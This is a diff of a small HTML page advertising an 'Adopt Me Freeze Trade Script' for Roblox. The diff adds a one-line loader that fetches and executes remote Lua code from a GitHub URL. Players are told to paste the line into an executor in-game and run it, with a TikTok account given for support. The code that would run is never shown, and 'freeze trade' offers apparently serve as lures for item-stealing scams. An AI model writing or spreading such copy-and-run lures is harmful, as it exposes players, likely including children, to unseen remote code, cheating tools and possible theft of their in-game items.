@@ -2,113 +2,22 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-    <title>Adopt Me Script</title>
-    <style>
-        body {
-            background: #222;
-            color: white;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-            font-family: Arial, sans-serif;
-        }
-
-        .container {
-            background: #ff69b4;
-            padding: 20px;
-            border-radius: 10px;
-            text-align: center;
-            width: 90%;
-            max-width: 400px;
-            box-shadow: 0 5px 15px rgba(255, 105, 180, 0.3);
-        }
-
-        h1 {
-            font-size: 26px;
-            color: white;
-            margin-bottom: 15px;
-        }
-
-        textarea {
-            width: calc(100% - 20px);
-            height: 100px;
-            padding: 10px;
-            margin-top: 10px;
-            border: none;
-            border-radius: 8px;
-            background: #f8c5d4;
-            color: #333;
-            font-size: 14px;
-            resize: none;
-            text-align: center;
-        }
-
-        .copy-btn {
-            background-color: #ff66b2;
-            color: white;
-            border: none;
-            padding: 10px 20px;
-            font-size: 16px;
-            cursor: pointer;
-            border-radius: 5px;
-            margin-top: 10px;
-            transition: background 0.3s;
-        }
-
-        .copy-btn:hover {
-            background-color: #ff3399;
-        }
-
-        .social-section {
-            margin-top: 15px;
-        }
-
-        .social {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 18px;
-            margin-top: 10px;
-        }
-
-        .snapchat {
-            color: #fffc00;
-        }
-
-        .discord {
-            color: #7289da;
-        }
-
-        .icon {
-            margin-right: 8px;
-        }
-    </style>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Adopt Me Freeze Trade Script</title>
+    <link rel="stylesheet" href="styles.css">
 </head>
 <body>
     <div class="container">
-        <h1>Adopt Me Script</h1>
-        <textarea id="scriptBox" rows="4" readonly>Paste your script here...</textarea>
-        <br>
-        <button class="copy-btn" onclick="copyScript()">📄 Copy Script</button>
-        <div class="discord">
-            <span>💬 DISCORD: yourdiscord#0000</span>
-        </div>
-        <div class="snapchat">
-            <span>👻 JAXSCRIPTS</span>
+        <h1>Adopt Me Freeze Trade Script</h1>
+        <textarea id="script-box" readonly>loadstring(game:HttpGet("https://raw.githubusercontent.com/jaxcodesx/jaxscriptadoptme/main/amscript", true))()</textarea>
+        <button onclick="copyScript()">📜 COPY SCRIPT</button>
+        <p id="copy-message" style="display:none; color: green;">✅ Script Copied! Paste & run in executor</p>
+        <p>Note: Works both on phone and PC executors. Go in-game, paste in executor, and run it. If it doesn't work, DM @kayplays.adoptme on TikTok.</p>
+        <div class="social">
+            <img src="snapchat.png" alt="Snapchat Logo" class="snapchat-logo">
+            <span>- your_snapchat_username</span>
         </div>
     </div>
-
-    <script>
-        function copyScript() {
-            var copyText = document.getElementById("scriptBox");
-            copyText.select();
-            copyText.setSelectionRange(0, 99999);
-            document.execCommand("copy");
-            alert("Copied the script!");
-        }
-    </script>
+    <script src="script.js"></script>
 </body>
 </html>
